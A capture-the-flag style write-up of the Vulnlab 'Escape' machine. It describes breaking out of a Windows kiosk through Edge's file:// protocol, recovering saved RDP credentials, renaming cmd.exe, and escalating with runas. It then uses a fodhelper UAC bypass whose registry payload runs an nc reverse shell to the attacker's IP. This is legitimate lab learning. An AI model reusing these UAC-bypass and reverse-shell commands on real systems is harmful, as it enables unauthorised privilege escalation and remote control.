# Vulnlab - Escape

## NMAP

```bash
PORT     STATE SERVICE       VERSION                            
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-02-23T17:04:09+00:00; +35s from scanner time.
| ssl-cert: Subject: commonName=Escape
| Issuer: commonName=Escape          
| Public Key type: rsa                     
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
```

From the scan we only have one port open which is RDP, on attempting login it's going to ask for credentials which we don't currently know 

<img src="https://i.imgur.com/lzzhWrW.png"/>

What if we try to see the login GUI, this can be done by disabling `NLA`

```bash
xfreerdp /v:10.10.73.33 -sec-nla
```

<img src="https://i.imgur.com/wSJZm25.png"/>

With this username, we'll be able to login

<img src="https://i.imgur.com/xDB40ZQ.png"/>

But we are only limited to just see this screen, meaning that we are in Kisok mode

<img src="https://i.imgur.com/0voNBrp.png"/>

Pressing the start button and using cmd or any other application didn't worked as it was restricted

<img src="https://i.imgur.com/EavpdNY.png"/>
We can however use Microsoft Edge and using `file` protocol, we can access the file system

<img src="https://i.imgur.com/s9XOnOf.png"/>

From `_admin` we can find an interesting file `profile.xml` having some encrypted password

<img src="https://i.imgur.com/wRmIQy2.png"/>

<img src="https://i.imgur.com/uaOgKnc.png"/>

I tried looking for resources to decrypt this password but there wasn't any tool to do that, we do have a tool called `BulletsPassView` which can reveal the passwords masked in bullets, on windows machine import the xml file using `Remote Desktop Plus` 

<img src="https://i.imgur.com/ZQApjtD.png"/>

And edit the profile, which will allow us to view the information in the profile, after that run bulletview, we'll get the plain text password

<img src="https://i.imgur.com/JPxUkTQ.png"/>

However, when logging to RDP with these credentials it's not going to allow that

<img src="https://i.imgur.com/hzyJONQ.png"/>
This translates to:

```
To log in remotely, you must have permission to log in through Remote Desktop Services. By default, members of the Principle Desktop Users group have this right. If your current user group does not have this permission, or if this permission has been removed from the Principle Desk user group, you must be granted this permission manually
```

So the workaround is to spawn a shell through kiosk user and then use runas to switch user, to do that we'll need to first find a way to spawn cmd and this can be done by copying `cmd.exe` in the directory where we have permission and rename it to `msedege.exe` as that's the only executable allowed in this kiosk mode

```
file:///C:/Windows/System32/cmd.exe
```

<img src="https://i.imgur.com/BFEKMkS.png"/>

<img src="https://i.imgur.com/idgA6yZ.png"/>

<img src="https://i.imgur.com/J3zX4iU.png"/>

Now using `runas`

```powershell
runas /user:Escape\admin cmd
```

<img src="https://i.imgur.com/Wkax4QS.png"/>

<img src="https://i.imgur.com/y0wv79G.png"/>

We can see here this is in administrators group but with medium mandatory level which means we have to do UAC bypass here

```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force

New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force

Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Users\admin\Desktop\nc.exe 10.8.0.136 2222 -e powershell.exe" -Force

 Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

<img src="https://i.imgur.com/cZ2svdS.png"/>

We'll receive a reverse shell with admin with all privileges.

<img src="https://i.imgur.com/8MqeNJZ.png"/>
<img src="https://i.imgur.com/LRRDNZq.png"/>
 But this shell didn't last long and got terminated, not sure why but I wasn't able to trigger it again as whenever I tried setting the property value it terminated powershell process

 <img src="https://i.imgur.com/upSCoAt.png"/>

Since we already have GUI we can just use  `Start-Process powershell -Verb runAs` (which I didn't know we could do that)

<img src="https://i.imgur.com/94C3BUg.png"/>

Having these privileges back again we are basically a local admin on the machine.
# References

- https://blog.nviso.eu/2022/05/24/breaking-out-of-windows-kiosks-using-only-microsoft-edge/
- https://www.nirsoft.net/utils/bullets_password_view.html
- https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692
- https://superuser.com/questions/55809/how-to-run-program-from-command-line-with-elevated-rights
